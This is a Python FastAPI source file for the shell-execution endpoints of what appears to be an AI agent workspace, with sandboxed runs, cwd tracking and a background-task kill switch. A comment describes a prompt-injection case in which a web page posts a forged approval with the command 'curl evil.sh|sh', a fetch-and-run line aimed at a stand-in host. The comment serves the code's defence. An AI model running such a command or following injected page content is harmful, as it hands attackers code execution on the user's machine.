"""Shell execution endpoints: run a command (foreground or background) and stop
a session's background tasks.
"""

import json
import os
import subprocess

from fastapi import Request
from fastapi.responses import Response

from .. import router
from ..commands import (
    _apply_stdin_redirect,
    _detect_image_output,
    _interpret_exit_code,
    _is_silent_command,
    _needs_stdin_redirect,
    _truncate_shell_output,
    _validate_command,
)
from ..state import get_workspace_path


@router.post("/shell")
async def ws_shell_endpoint(request: Request):
    body = await request.json()
    ws = get_workspace_path()
    if not ws:
        return Response(
            content=json.dumps({"error": "No workspace"}),
            status_code=400,
            media_type="application/json",
        )
    command = body.get("command", "").strip()
    if not command:
        return Response(
            content=json.dumps({"error": "No command"}),
            status_code=400,
            media_type="application/json",
        )
    # Always run validation. The earlier `if not body.get("user_approved")`
    # skip was a client-asserted bypass — a prompt-injected web page
    # rendered in the SPA could POST {user_approved: true, command:
    # "curl evil.sh|sh"} and skip every guard. The approval-router
    # registry at server/approval/router.py provides the real
    # server-side approval flow for commands that genuinely need to
    # bypass validation; clients call /api/approval/execute with
    # action="command" instead of fabricating their own approval.
    warning = _validate_command(command)
    if warning:
        return Response(
            content=json.dumps({"error": warning}), status_code=403, media_type="application/json"
        )
    # Shell snapshot: run under the user's shell profile. wrap_command
    # re-executes under the snapshot's shell, so it must be the OUTERMOST
    # wrapper, applied per branch below after stdin/cwd wrapping.
    session_id = body.get("session_id", "")
    # Working directory persistence: use session's last cwd
    from server.cwd_tracker import (
        extract_cwd_from_output,
        get_cwd,
        update_cwd,
        wrap_command_for_cwd,
    )
    from server.shell_snapshot import wrap_command

    effective_cwd = get_cwd(session_id, ws) if session_id else ws
    # Background execution: start task and return immediately
    if body.get("background", False):
        from server.tasks.shell import start_shell_task

        bg_command = wrap_command(command, session_id) if session_id else command
        task_info = start_shell_task(
            command, cwd=effective_cwd, session_id=session_id, exec_command=bg_command
        )
        return {"background": True, **task_info}
    # P0: Stdin redirect to prevent interactive hangs (before first pipe)
    redirected = _apply_stdin_redirect(command) if _needs_stdin_redirect(command) else command
    exec_command = wrap_command_for_cwd(redirected)
    if session_id:
        exec_command = wrap_command(exec_command, session_id)
    try:
        from server.sandbox import run_sandboxed

        result = run_sandboxed(exec_command, cwd=effective_cwd, timeout=60)
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += ("\n" if output else "") + result.stderr
        # Extract and persist cwd before cleaning output
        output_text = output.strip()
        clean_output, new_cwd = extract_cwd_from_output(output_text)
        if session_id and new_cwd and os.path.isdir(new_cwd):
            update_cwd(session_id, new_cwd)
        if not clean_output:
            output = (
                "Done." if result.returncode == 0 and _is_silent_command(command) else "(no output)"
            )
        else:
            output = clean_output
        # P0: Truncate large output
        output = _truncate_shell_output(output)
        # P1: Semantic exit code interpretation
        meaning = _interpret_exit_code(command, result.returncode)
        if meaning:
            output += f"\n(exit code {result.returncode}: {meaning})"
        resp = {"output": output, "exit_code": result.returncode, "cwd": new_cwd or effective_cwd}
        image = _detect_image_output(clean_output or "")
        if image:
            resp["image"] = image
        return resp
    except subprocess.TimeoutExpired:
        return {"output": "Error: timed out (60s)", "exit_code": -1}
    except Exception as e:
        return {"output": f"Error: {e}", "exit_code": -1}


@router.post("/shell/tasks/stop")
async def ws_shell_tasks_stop(request: Request):
    """Stop every running background task the given session started.

    Wired to the ESC kill switch (streamControl.killSessionStream) so a
    runaway background command dies with the rest of the turn instead of
    outliving it."""
    from server.tasks.shell import stop_session_tasks

    body = await request.json()
    session_id = (body.get("session_id") or "").strip()
    if not session_id:
        return Response(
            content=json.dumps({"error": "session_id required"}),
            status_code=400,
            media_type="application/json",
        )
    stopped = stop_session_tasks(session_id)
    return {"stopped": stopped}
